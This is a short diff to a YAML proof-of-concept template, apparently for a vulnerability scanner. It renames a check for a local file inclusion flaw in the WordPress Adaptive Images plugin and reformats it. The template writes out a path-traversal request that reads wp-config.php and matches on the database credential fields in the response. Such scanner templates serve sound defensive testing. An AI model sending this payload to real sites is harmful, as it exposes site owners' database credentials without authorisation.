@@ -1,10 +1,9 @@
-name: poc-yaml-wp-ext-adaptive-images-lfi
+name: poc-yaml-wordpress-ext-adaptive-images-lfi
 rules:
   - method: GET
-    path: >-
-      /wp-content/plugins/adaptive-images/adaptive-images-script.php?adaptive-images-settings[source_file]=../../../wp-config.php
+    path: "/wp-content/plugins/adaptive-images/adaptive-images-script.php?adaptive-images-settings[source_file]=../../../wp-config.php"
     follow_redirects: false
-    expression: >
+    expression: |
       status == 200 && body.bcontains(b'DB_NAME') && body.bcontains(b'DB_USER') &&
       body.bcontains(b'DB_PASSWORD') && body.bcontains(b'DB_HOST') 
 detail:
